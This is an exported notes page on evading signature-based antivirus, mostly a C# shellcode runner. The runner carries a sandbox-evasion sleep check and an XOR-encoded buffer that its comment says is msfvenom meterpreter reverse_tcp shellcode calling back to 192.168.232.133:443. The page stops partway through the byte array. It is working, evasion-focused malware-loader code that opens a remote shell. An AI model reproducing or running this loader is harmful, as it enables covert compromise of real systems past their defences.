<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Bypass signature based</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Bypass signature based</h1><br/><p></p><p><h2>Bypassing Antivirus with C# (xor)</h2><ul><li><small>As we have discovered, public code and techniques are often flagged by antivirus software. This makes sense since antivirus vendors have access to this code as well and have taken the time to properly analyze it.</small></li><li><small>There are two effective ways to avoid detection writen our own code with custom shellcode runners or manually obfuscate any code we use</small></li><li><small>Custom shellcode runner</small></p><p></li></ul><div class="codebox"><pre>        <span style="color:#ff9d00;font-weight:700">using</span> System.Runtime.InteropServices;<br />        <span style="color:#ff9d00;font-weight:700">using</span> System;<br /><br />        <span style="color:#ff9d00;font-weight:700">namespace</span> rev<br />        {<br />            <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">class</span> Program<br />            {<br />                <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">const</span> <span style="color:#7f0044;font-weight:400">uint</span> EXECUTEREADWRITE  = <span style="color:#ff0044;font-weight:400">0x40</span>;<br />                <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">const</span> <span style="color:#7f0044;font-weight:400">uint</span> COMMIT_RESERVE = <span style="color:#ff0044;font-weight:400">0x3000</span>;<br /><br />                [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>)]<br />                <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> <span style="color:#ff9d00;font-weight:700">void</span> Sleep(<span style="color:#7f0044;font-weight:400">uint</span> dwMilliseconds);<br /><br />                [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>, ExactSpelling = <span style="color:#ff0044;font-weight:400">true</span>)]<br />                <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr VirtualAlloc(IntPtr lpAddress, <span style="color:#7f0044;font-weight:400">int</span> dwSize, <span style="color:#7f0044;font-weight:400">uint</span> flAllocationType, <span style="color:#7f0044;font-weight:400">uint</span> flProtect);<br /><br />                [DllImport(<span style="color:#3ad900;font-weight:400">&quot;Kernel32.dll&quot;</span>, CharSet = CharSet.Auto, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />                <span style="color:#ff9d00;font-weight:700">private</span> <span style="color:#ff9d00;font-weight:700">unsafe</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> IntPtr CreateThread(IntPtr lpThreadAttributes, <span style="color:#7f0044;font-weight:400">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span style="color:#7f0044;font-weight:400">uint</span> dwCreationFlags, <span style="color:#7f0044;font-weight:400">uint</span> lpThreadId);<br /><br />                [DllImport(<span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span>, SetLastError = <span style="color:#ff0044;font-weight:400">true</span>)]<br />                <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">extern</span> Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);<br /><br />                <span style="color:#ff9d00;font-weight:700">public</span> <span style="color:#ff9d00;font-weight:700">static</span> <span style="color:#ff9d00;font-weight:700">void</span> Main()<br />                {<br /><br />                    DateTime t1 = DateTime.Now;<br />                    Sleep(<span style="color:#ff0044;font-weight:400">10000</span>);<br />                    <span style="color:#7f0044;font-weight:400">double</span> deltaT = DateTime.Now.Subtract(t1).TotalSeconds;<br />                    <span style="color:#ff9d00;font-weight:700">if</span> (deltaT &lt; <span style="color:#ff0044;font-weight:400">9.5</span>)<br />                    {<br />                        <span style="color:#ff9d00;font-weight:700">return</span>;<br />                    }<br /><br />                    <span style="color:#0088ff;font-weight:400">// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp</span><br />                    <span style="color:#0088ff;font-weight:400">// XORed with key 0xfa</span><br />                    <span style="color:#7f0044;font-weight:400">byte</span>[] buf = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#ff0044;font-weight:400">511</span>] {<br />                    <span style="color:#ff0044;font-weight:400">0x06</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x79</span>, <span style="color:#ff0044;font-weight:400">0x1e</span>, <span style="color:#ff0044;font-weight:400">0x0a</span>, <span style="color:#ff0044;font-weight:400">0x12</span>, <span style="color:#ff0044;font-weight:400">0x36</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xab</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xaa</span>, <span style="color:#ff0044;font-weight:400">0xa8</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xab</span>, <span style="color:#ff0044;font-weight:400">0xac</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x28</span>, <span style="color:#ff0044;font-weight:400">0x9f</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0xa8</span>, <span style="color:#ff0044;font-weight:400">0x9a</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0xa8</span>, <span style="color:#ff0044;font-weight:400">0xe2</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0xa8</span>, <span style="color:#ff0044;font-weight:400">0xda</span>, <span style="color:#ff0044;font-weight:400">0xb7</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0x88</span>, <span style="color:#ff0044;font-weight:400">0xaa</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0xf5</span>, <span style="color:#ff0044;font-weight:400">0x4d</span>, <span style="color:#ff0044;font-weight:400">0xb0</span>, <span style="color:#ff0044;font-weight:400">0xb0</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x3a</span>, <span style="color:#ff0044;font-weight:400">0x56</span>, <span style="color:#ff0044;font-weight:400">0xc6</span>, <span style="color:#ff0044;font-weight:400">0x9b</span>, <span style="color:#ff0044;font-weight:400">0x86</span>, <span style="color:#ff0044;font-weight:400">0xf8</span>, <span style="color:#ff0044;font-weight:400">0xd6</span>, <span style="color:#ff0044;font-weight:400">0xda</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x3b</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xf7</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0x3b</span>, <span style="color:#ff0044;font-weight:400">0x18</span>, <span style="color:#ff0044;font-weight:400">0x17</span>, <span style="color:#ff0044;font-weight:400">0xa8</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xab</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0xa8</span>, <span style="color:#ff0044;font-weight:400">0xda</span>, <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0xb8</span>, <span style="color:#ff0044;font-weight:400">0xc6</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0x2a</span>, <span style="color:#ff0044;font-weight:400">0x9c</span>, <span style="color:#ff0044;font-weight:400">0x7b</span>, <span style="color:#ff0044;font-weight:400">0x82</span>, <span style="color:#ff0044;font-weight:400">0xe2</span>, <span style="color:#ff0044;font-weight:400">0xf1</span>, <span style="color:#ff0044;font-weight:400">0xf8</span>, <span style="color:#ff0044;font-weight:400">0xf5</span>, <span style="color:#ff0044;font-weight:400">0x7f</span>, <span style="color:#ff0044;font-weight:400">0x88</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0x71</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x7a</span>, <span style="color:#ff0044;font-weight:400">0x72</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x7f</span>, <span style="color:#ff0044;font-weight:400">0x3a</span>, <span style="color:#ff0044;font-weight:400">0x8e</span>, <span style="color:#ff0044;font-weight:400">0x9d</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0x2a</span>, <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xe2</span>, <span style="color:#ff0044;font-weight:400">0xaa</span>, <span style="color:#ff0044;font-weight:400">0xbe</span>, <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0xba</span>, <span style="color:#ff0044;font-weight:400">0xda</span>, <span style="color:#ff0044;font-weight:400">0xb3</span>, <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0x2a</span>, <span style="color:#ff0044;font-weight:400">0x19</span>, <span style="color:#ff0044;font-weight:400">0xac</span>, <span style="color:#ff0044;font-weight:400">0xb7</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0xce</span>, <span style="color:#ff0044;font-weight:400">0x72</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0x2c</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x3a</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x3b</span>, <span style="color:#ff0044;font-weight:400">0x33</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xf7</span>, <span style="color:#ff0044;font-weight:400">0x56</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0x3b</span>, <span style="color:#ff0044;font-weight:400">0xc2</span>, <span style="color:#ff0044;font-weight:400">0x1a</span>, <span style="color:#ff0044;font-weight:400">0x8f</span>, <span style="color:#ff0044;font-weight:400">0x0b</span>, <span style="color:#ff0044;font-weight:400">0xb6</span>, <span style="color:#ff0044;font-weight:400">0xf9</span>, <span style="color:#ff0044;font-weight:400">0xb6</span>, <span style="color:#ff0044;font-weight:400">0xde</span>, <span style="color:#ff0044;font-weight:400">0xf2</span>, <span style="color:#ff0044;font-weight:400">0xbf</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xc3</span>, <span style="color:#ff0044;font-weight:400">0x2b</span>, <span style="color:#ff0044;font-weight:400">0x8f</span>, <span style="color:#ff0044;font-weight:400">0x22</span>, <span style="color:#ff0044;font-weight:400">0xa2</span>, <span style="color:#ff0044;font-weight:400">0xbe</span>, <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0xba</span>, <span style="color:#ff0044;font-weight:400">0xde</span>, <span style="color:#ff0044;font-weight:400">0xb3</span>, <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0x2a</span>, <span style="color:#ff0044;font-weight:400">0x9c</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x71</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xf6</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0xbe</span>, <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0xba</span>, <span style="color:#ff0044;font-weight:400">0xe6</span>, <span style="color:#ff0044;font-weight:400">0xb3</span>, <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0x2a</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0xfe</span>, <span style="color:#ff0044;font-weight:400">0x72</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xa2</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xa2</span>, <span style="color:#ff0044;font-weight:400">0xa4</span>, <span style="color:#ff0044;font-weight:400">0xa3</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0x2a</span>, <span style="color:#ff0044;font-weight:400">0xa0</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xa2</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xa3</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xa0</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x79</span>, <span style="color:#ff0044;font-weight:400">0x16</span>, <span style="color:#ff0044;font-weight:400">0xda</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xa8</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x1a</span>, <span style="color:#ff0044;font-weight:400">0xa2</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xa3</span>, <span style="color:#ff0044;font-weight:400">0xa0</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x71</span>, <span style="color:#ff0044;font-weight:400">0xe8</span>, <span style="color:#ff0044;font-weight:400">0x13</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xb1</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0xa7</span>, <span style="color:#ff0044;font-weight:400">0xb3</span>, <span style="color:#ff0044;font-weight:400">0x44</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0x89</span>, <span style="color:#ff0044;font-weight:400">0xc8</span>, <span style="color:#ff0044;font-weight:400">0xa5</span>, <span style="color:#ff0044;font-weight:400">0xc9</span>, <span style="color:#ff0044;font-weight:400">0xc8</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xac</span>, <span style="color:#ff0044;font-weight:400">0xb3</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x1c</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x7b</span>, <span style="color:#ff0044;font-weight:400">0x16</span>, <span style="color:#ff0044;font-weight:400">0x5a</span>, <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xb3</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x1f</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xb3</span>, <span style="color:#ff0044;font-weight:400">0x46</span>, <span style="color:#ff0044;font-weight:400">0xf8</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0x41</span>, <span style="color:#ff0044;font-weight:400">0x3a</span>, <span style="color:#ff0044;font-weight:400">0x52</span>, <span style="color:#ff0044;font-weight:400">0x12</span>, <span style="color:#ff0044;font-weight:400">0x7f</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xae</span>, <span style="color:#ff0044;font-weight:400">0xb3</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x1e</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xb6</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x0b</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x40</span>, <span style="color:#ff0044;font-weight:400">0xb6</span>, <span style="color:#ff0044;font-weight:400">0x8d</span>, <span style="color:#ff0044;font-weight:400">0xdc</span>, <span style="color:#ff0044;font-weight:400">0xfd</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x2f</span>, <span style="color:#ff0044;font-weight:400">0xb6</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x10</span>, <span style="color:#ff0044;font-weight:400">0x92</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0xfb</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xa3</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x40</span>, <span style="color:#ff0044;font-weight:400">0xd3</span>, <span style="color:#ff0044;font-weight:400">0x7a</span>, <span style="color:#ff0044;font-weight:400">0x91</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x2f</span>, <span style="color:#ff0044;font-weight:400">0x90</span>, <span style="color:#ff0044;font-weight:400">0xf0</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xa4</span>, <span style="color:#ff0044;font-weight:400">0xaa</span>, <span style="color:#ff0044;font-weight:400">0xaa</span>, <span style="color:#ff0044;font-weight:400">0xb7</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xb7</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x3a</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x3a</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x73</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x38</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x3a</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x3b</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x40</span>, <span style="color:#ff0044;font-weight:400">0x10</span>, <span style="color:#ff0044;font-weight:400">0xf5</span>, <span style="color:#ff0044;font-weight:400">0x25</span>, <span style="color:#ff0044;font-weight:400">0x1a</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x2f</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x3d</span>, <span style="color:#ff0044;font-weight:400">0x90</span>, <span style="color:#ff0044;font-weight:400">0xea</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xa2</span>, <span style="color:#ff0044;font-weight:400">0xb6</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x18</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x40</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x63</span>, <span style="color:#ff0044;font-weight:400">0x5f</span>, <span style="color:#ff0044;font-weight:400">0x8e</span>, <span style="color:#ff0044;font-weight:400">0x9b</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x2f</span>, <span style="color:#ff0044;font-weight:400">0x7f</span>, <span style="color:#ff0044;font-weight:400">0x3a</span>, <span style="color:#ff0044;font-weight:400">0x8e</span>, <span style="color:#ff0044;font-weight:400">0xf0</span>, <span style="color:#ff0044;font-weight:400">0xb3</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x34</span>, <span style="color:#ff0044;font-weight:400">0x8f</span>, <span style="color:#ff0044;font-weight:400">0x1f</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x12</span>, <span style="color:#ff0044;font-weight:400">0x69</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x79</span>, <span style="color:#ff0044;font-weight:400">0x16</span>, <span style="color:#ff0044;font-weight:400">0xea</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x18</span>, <span style="color:#ff0044;font-weight:400">0xb7</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x33</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x90</span>, <span style="color:#ff0044;font-weight:400">0xfe</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xa2</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x40</span>, <span style="color:#ff0044;font-weight:400">0xf8</span>, <span style="color:#ff0044;font-weight:400">0x23</span>, <span style="color:#ff0044;font-weight:400">0x32</span>, <span style="color:#ff0044;font-weight:400">0xa5</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x2f</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x79</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0x84</span>, <span style="color:#ff0044;font-weight:400">0xaf</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x79</span>, <span style="color:#ff0044;font-weight:400">0x3e</span>, <span style="color:#ff0044;font-weight:400">0xda</span>, <span style="color:#ff0044;font-weight:400">0xa4</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x0c</span>, <span style="color:#ff0044;font-weight:400">0x90</span>, <span style="color:#ff0044;font-weight:400">0xba</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xa3</span>, <span style="color:#ff0044;font-weight:400">0x92</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xea</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xa2</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x08</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>, <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x40</span>, <span style="color:#ff0044;font-weight:400">0xa2</span>, <span style="color:#ff0044;font-weight:400">0x5e</span>, <span style="color:#ff0044;font-weight:400">0xa9</span>, <span style="color:#ff0044;font-weight:400">0x1f</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x2f</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x39</span>, <span style="color:#ff0044;font-weight:400">0xb3</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x3d</span>, <span style="color:#ff0044;font-weight:400">0xb7</span>, <span style="color:#ff0044;font-weight:400">0xcb</span>,<br />                    <span style="color:#ff0044;font-weight:400">0x33</span>, <span style="color:#ff0044;font-weight:400">0xb3</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x0a</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x20</span>, <span style="color:#ff0044;font-weight:400">0xb2</span>, <span style="color:#ff0044;font-weight:400">0x73</span>, <span style="color:#ff0044;font-weight:400">0x03</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x40</span>, <span style="color:#ff0044;font-weight:400">0xf8</span>, <span style="color:#ff0044;font-weight:400">0x23</span>, <span style="color:#ff0044;font-weight:400">0x32</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xa5</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x2f</span>, <span style="color:#ff0044;font-weight:400">0x79</span>, <span style="color:#ff0044;font-weight:400">0x02</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0x87</span>, <span style="color:#ff0044;font-weight:400">0xd2</span>, <span style="color:#ff0044;font-weight:400">0xa2</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xad</span>, <span style="color:#ff0044;font-weight:400">0xa3</span>, <span style="color:#ff0044;font-weight:400">0x92</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xba</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0xa2</span>, <span style="color:#ff0044;font-weight:400">0x90</span>, <span style="color:#ff0044;font-weight:400">0xfa</span>, <span style="color:#ff0044;font-weight:400">0xa0</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x40</span>, <span style="color:#ff0044;font-weight:400">0xf1</span>, <span style="color:#ff0044;font-weight:400">0xd5</span>, <span style="color:#ff0044;font-weight:400">0xf5</span>, <span style="color:#ff0044;font-weight:400">0xca</span>, <span style="color:#ff0044;font-weight:400">0x05</span>, <span style="color:#ff0044;font-weight:400">0x2f</span>,<br />                    <span style="color:#ff0044;font-weight:400">0xad</span>, <span style="color:#ff0044;font-weight:400">0xa3</span>, <span style="color:#ff0044;font-weight:400">0xbb</span>, <span style="color:#ff0044;font-weight:400">0x40</span>, <span style="color:#ff0044;font-weight:400">0x8f</span>, <span style="color:#ff0044;font-weight:400">0x94</span>, <span style="color:#ff0044;font-weight:400">0xb7</span>, 